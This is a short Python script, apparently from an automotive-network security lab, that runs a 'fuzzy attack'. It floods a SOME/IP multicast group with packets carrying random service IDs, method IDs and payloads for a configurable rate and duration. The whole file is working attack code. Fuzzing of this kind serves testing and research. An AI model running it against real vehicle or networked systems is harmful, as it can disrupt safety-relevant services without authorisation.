"""
Fuzzy attack — Service ID / Method ID / payload aleatorios.
"""

import socket
import time
import random
import struct

from someip_network.network import MULTICAST_GROUP, MULTICAST_PORT
from someip_network.packet import HEADER_FMT


def run(rate_hz=50, duration_s=30):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    interval = 1.0 / rate_hz
    deadline = time.time() + duration_s
    sent     = 0

    print(f'[Fuzzy] Iniciando @ {rate_hz}Hz por {duration_s}s')

    while time.time() < deadline:
        service_id  = random.randint(0x0000, 0xFFFF)
        method_id   = random.randint(0x0000, 0xFFFF)
        payload_len = random.randint(0, 64)
        payload     = bytes(random.randint(0, 255) for _ in range(payload_len))
        length      = 8 + payload_len
        header = struct.pack(
            HEADER_FMT,
            service_id, method_id, length,
            random.randint(0, 0xFFFF),
            random.randint(0, 0xFFFF),
            0x01, 0x01, 0x02, 0x00,
        )
        sock.sendto(header + payload, (MULTICAST_GROUP, MULTICAST_PORT))
        sent += 1
        time.sleep(interval)

    sock.close()
    print(f'[Fuzzy] Encerrado — {sent} pacotes enviados')


if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument('--rate',     type=int, default=50)
    p.add_argument('--duration', type=int, default=30)
    args = p.parse_args()
    run(args.rate, args.duration)
